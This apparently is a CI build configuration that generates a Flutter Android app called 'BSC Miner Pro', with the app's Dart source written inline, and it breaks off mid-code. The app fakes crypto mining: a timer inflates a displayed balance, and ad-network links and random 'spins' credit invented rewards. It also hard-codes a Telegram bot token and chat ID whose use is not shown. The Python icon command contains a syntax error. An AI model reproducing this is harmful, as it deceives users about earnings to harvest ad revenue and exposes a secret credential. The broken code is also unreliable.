workflows:
  android-workflow:
    name: android-workflow
    max_build_duration: 30
    instance_type: mac_mini_m2
    environment:
      flutter: stable
    scripts:
      - name: VIBE PRO BUILD V3
        script: |
          set -e
          flutter create --platforms=android --org com.bscminer.app . --overwrite
          pip3 install pillow -q
          mkdir -p assets
          python3 -c "from PIL import Image, ImageDraw; img=Image.new('RGB',(1024,1024),'#0B0E11'); d=ImageDraw.Draw(img); d.ellipse([60,60,964,964],fill:'#F3BA2F'); d.ellipse([140,140,884,884],fill:'#0B0E11'); d.ellipse([320,320,704,704],fill:'#F3BA2F'); img.save('assets/icon.png')"
          cat > pubspec.yaml << 'YAML'
          name: bsc_miner_pro
          version: 3.0.0+11
          publish_to: none
          environment:
            sdk: ">=3.0.0 <4.0.0"
          dependencies:
            flutter:
              sdk: flutter
            url_launcher: ^6.2.5
            share_plus: ^10.0.2
            http: ^1.2.2
          flutter:
            uses-material-design: true
            assets:
              - assets/icon.png
          YAML
          mkdir -p lib
          cat > lib/main.dart << 'DART'
          import 'dart:async';import 'dart:math';import 'package:flutter/material.dart';import 'package:url_launcher/url_launcher.dart';import 'package:http/http.dart' as http;
          void main()=>runApp(MaterialApp(debugShowCheckedModeBanner:false,theme:ThemeData.dark().copyWith(scaffoldBackgroundColor:Color(0xFF0B0E11)),home:Pro()));
          class Pro extends StatefulWidget{@override State<Pro> createState()=>_ProState();}
          class _ProState extends State<Pro> with TickerProviderStateMixin{
          double bal=0.0054073;int spins=5;bool mining=true;late AnimationController pulse;
          final bot='8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';final chat='8296278042';
          @override void initState(){super.initState();pulse=AnimationController(vsync:this,duration:Duration(milliseconds:900))..repeat(reverse:true);Timer.periodic(Duration(milliseconds:90),(t){if(mining) setState(()=>bal+=0.00000021);});}
          Future<void> boost()=>launchAd(0.00018);
          Future<void> launchAd(double r)async{final u=Uri.parse('https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f');await launchUrl(u,mode:LaunchMode.externalApplication);setState(()=>{bal+=r,spins++,mining=true});}
          void spin(){if(spins<=0){ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Watch Ad For Spin!')));return;}double w=[0.0003,0.0007,0.0012,0.0025][Random().nextInt(4)];setState(()=>{bal+=w,spins--});showDialog(context:context,builder:(_)=>Dialog(backgroundColor:Color(0xFF1E2329),shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(20)),child:Padding(padding:EdgeInsets.all(24
